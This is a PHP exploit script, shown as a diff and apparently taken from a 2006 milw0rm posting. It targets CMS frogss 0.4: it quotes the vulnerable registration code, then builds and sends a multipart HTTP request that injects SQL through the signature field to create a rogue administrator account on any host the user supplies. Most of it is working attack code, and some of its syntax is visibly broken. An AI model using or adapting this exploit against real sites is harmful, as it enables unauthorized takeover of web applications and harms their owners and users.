@@ -1,0 +1,301 @@
+<?php
+echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~";
+echo "+\r\n";
+echo "-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -\r\n\r\n";
+echo "+\r\n";
+echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\r\n";
+echo "+\r\n\r\n";
+echo "- CMS frogss <= 0.4 (podpis) SQL Injection Exploit [creat new admin]"\r\n";
+echo "+"\r\n";
+echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"\r\n";
+echo "+"\r\n";
+echo "- [Script name: CMS frogss v.0.4"\r\n";
+echo "- [Script site: http://frogss.be/download.php?id=1"\r\n";
+echo "+"\r\n";
+echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"\r\n";
+echo "+"\r\n";
+echo "-          Find by: Kacper (a.k.a Rahim)"\r\n";
+echo "+"\r\n";
+echo "-          Contact: kacper1964@yahoo.pl"\r\n";
+echo "-                        or"\r\n";
+echo "-           http://www.rahim.webd.pl/"\r\n";
+echo "+"\r\n";
+echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\r\n";
+echo "+"\r\n";
+echo "- Special Greetz: DragonHeart ;-)"\r\n";
+echo "- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi, nukedclx, mivus ;]"\r\n";
+echo "+"\r\n";
+echo "!@ Przyjazni nie da sie zamienic na marne korzysci @!"\r\n";
+echo "+"\r\n";
+echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\r\n";
+echo "+"\r\n";
+echo "-            Z Dedykacja dla osoby,"\r\n";
+echo "-         bez ktorej nie mogl bym zyc..."\r\n";
+echo "-           K.C:* J.M (a.k.a Magaja)"\r\n";
+echo "+"\r\n";
+echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\r\n";
+echo "+"\r\n";
+echo "Usage: www.site.com /path/ UserName Password proxy "\r\n";
+echo "ex: www.site.com <= site host "\r\n";
+echo "ex: /path/ <= script path "\r\n";
+echo "ex: Username <= exploit username "\r\n";
+echo "ex: Password <= exploit password "\r\n";
+echo "ex: proxy <= optional ;-) "\r\n";
+echo "+"\r\n";
+echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\r\n";
+echo "EX: www.site.com /frogss/ Evil hacker 127.0.0.1 "\r\n";
+echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\r\n";
+
+/*
+vulnerable code => module/rejestracja.php line 56-87:
+....
+function ok()
+{
+    global $login,$haslo,$email,$miasto,$www,$gg,$tlen,$poziom,$podpis,$last_log,$logowan,$komentarzy,$odwiedzin,$ip,$lan;
+    $query=mysql_query("SELECT login FROM uzytkownicy WHERE login='".$login."'");
+    if (!$login) {
+
+    echo 'Nie poda쿮� Loginu';
+    } elseif (!$haslo){
+        echo 'Nie poda쿮� has쿪';
+    } elseif (!$email)
+    {
+        echo 'Nie poda쿮� e-maila';
+    } elseif(mysql_num_rows($query)==0)
+{
+if($www=='http://') $www = '';
+if($gg=='gg:') $gg = '';
+if($tlen=='tlen:') $tlen = '';
+$haslomd5 = md5($haslo);
+$ip = $_SERVER['REMOTE_ADDR'];
+$query1 = "INSERT INTO uzytkownicy VALUES(NOT NULL, '$login', '$haslomd5', '$email', '$miasto', '$www', '$gg', '$tlen', '$poziom', '$podpis', NOW(), '$last_log', '$logowan', '$komentarzy', '$odwiedzin', 'offline', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '0', '0', '0', '$ip')";
+$result = mysql_query ($query1);
+if($result)
+        {
+            echo '<br>'.$lan['registration_add'].'<br>';
+        }
+        else
+        {
+            echo '<br>'.$lan['registration_add_error'].'<br><br>';
+        }
+}
+else
+{
+....
+when we register to new user in $podpis we can insert in  SQL injection ;-)
+
+*/
+
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+ob_implicit_flush (1);
+function show($headeri)
+{
+  $ii=0;$ji=0;$ki=0;$ci=0;
+  echo '<table border="0"><tr>';
+  while ($ii <= strlen($headeri)-1){
+    $datai=dechex(ord($headeri[$ii]));
+    if ($ji==16) {
+      $ji=0;
+      $ci++;
+      echo "<td>&nbsp;&nbsp;</td>";
+      for ($li=0; $li<=15; $li++) {
+        echo "<td>".htmlentities($headeri[$li+$ki])."</td>";
+		}
+      $ki=$ki+16;
+      echo "</tr><tr>";
+    }
+    if (strlen($datai)==1) {
+      echo "<td>0".htmlentities($datai)."</td>";
+    }
+    else {
+      echo "<td>".htmlentities($datai)."</td> ";
+    }
+    $ii++;$ji++;
+  }
+  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {
+    echo "<td>&nbsp&nbsp</td>";
+  }
+  for ($li=$ci*16; $li<=strlen($headeri); $li++) {
+    echo "<td>".htmlentities($headeri[$li])."</td>";
+  }
+  echo "</tr></table>";
+}
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacket()
+{
+  global $proxy, $host, $port, $packet, $html, $proxy_regex;
+  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+  if ($socket < 0) {
+    echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
+  }
+  else {
+    $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {echo 'Not a valid proxy...';
+    die;
+    }
+  echo "OK.<br>";
+  echo "Attempting to connect to ".$host." on port ".$port."...<br>";
+  if ($proxy=='') {
+    $result = socket_connect($socket, $host, $port);
+  }
+  else {
+    $parts =explode(':',$proxy);
+    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+    $result = socket_connect($socket, $parts[0],$parts[1]);
+  }
+  if ($result < 0) {
+    echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
+  }
+  else {
+    echo "OK.<br><br>";
+    $html= '';
+    socket_write($socket, $packet, strlen($packet));
+    echo "Reading response:<br>";
+    while ($out= socket_read($socket, 2048)) {$html.=$out;}
+    echo nl2br(htmlentities($html));
+    echo "Closing socket...";
+    socket_close($socket);
+  }
+  }
+}
+
+function refresh()
+{
+  flush();
+  ob_flush();
+  usleep(5000000000);
+}
+
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.htmlentities($host); die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid prozy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);echo nl2br(htmlentities($html));
+}
+
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$_POST[host];$port=$_POST[port];$path=$_POST[path];
+$USER=$_POST[USER];$PASS=$_POST[PASS];$proxy=$_POST[proxy];
+
+echo "<span class=\"Stile5\">";
+
+  if (($host<>'') and ($path<>''))
+  {
+    $port=intval(trim($port));
+    if ($port=='') {$port=80;}
+    if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die('Error... check the path!');}
+    if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+  }
+  if (($host<>'') and ($path<>'') and ($USER<>'') and ($PASS<>''))
+  {
+  
+    $sql="') INSERT INTO uzytkownicy VALUES(1, Kacper, b98092e78aa47e68ae2ba617137960a4, devilteam@hackers.pl, NULL, http://www.rahim.webd.pl/, NULL, NULL, 0, DEVILTEAM, NOW(), 99999, 99999, 99999, 9999, offline, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 4)/*";
+    $data='-----------------------------7d62702f250530
+    Content-Disposition: form-data; name="login";
+    
+    '.$USER.'
+    -----------------------------7d62702f250530
+    Content-Disposition: form-data; name="haslo";
+    
+    '.$PASS.'
+    -----------------------------7d62702f250530
+    Content-Disposition: form-data; name="email";
+    
+    devilteam@polish-hackers.pl
+    -----------------------------7d62702f250530
+    Content-Disposition: form-data; name="miasto";
+    
+    localhost
+    -----------------------------7d62702f250530
+    Content-Disposition: form-data; name="www";
+    
+    http://www.rahim.webd.pl/
+    -----------------------------7d62702f250530
+    Content-Disposition: form-data; name="gg";
+    
+    000000
+    -----------------------------7d62702f250530
+    Content-Disposition: form-data; name="tlen";
+    
+    h20
+    -----------------------------7d62702f250530--
+    Content-Disposition: form-data; name="podpis";
+    
+    '.$sql.'
+    -----------------------------7d62702f250530--
+    Content-Disposition: form-data; name="Dodaj";
+    
+    Dodaj
+    -----------------------------7d62702f250530--
+    ';
+
+    $packet ="POST ".$p."login.php HTTP/1.1\r\n";
+    $packet.="User-Agent: Googlebot/2.1\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Accept: text/plain\r\n";
+    $packet.="Referer: http://".$host.$path."index.php?lang=en\r\n";
+    $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n";
+    $packet.="Content-Length: ".strlen($data)."\r\n";
+    $packet.=$data;
+	$packet.="Connection: Close\r\n";
+    show($packet);
+    sendpacketii($packet);
+    if (!eregi("Location:",$html)) {die("Failed to login...");}
+    $temp=explode("Set-Cookie: ",$html);
+    $COOKIE='';
+    for ($i=1; $i<=6; $i++)
+    {
+      $temp2=explode(" ",$temp[$i]);
+      $COOKIE.=" ".$temp2[0];
+    }
+   if (eregi("The user has successfully been added",$html))
+{
+  echo "exploit succeeded... now login as admin\n";
+  echo "with username \"Kacper"\" and password \"devilteam"\"\n";
+  echo ".$host."/Administracja/index.php\"\n";
+  echo "Greetz ;-)"\n";
+}
+?>
+
+# milw0rm.com [2006-08-27]
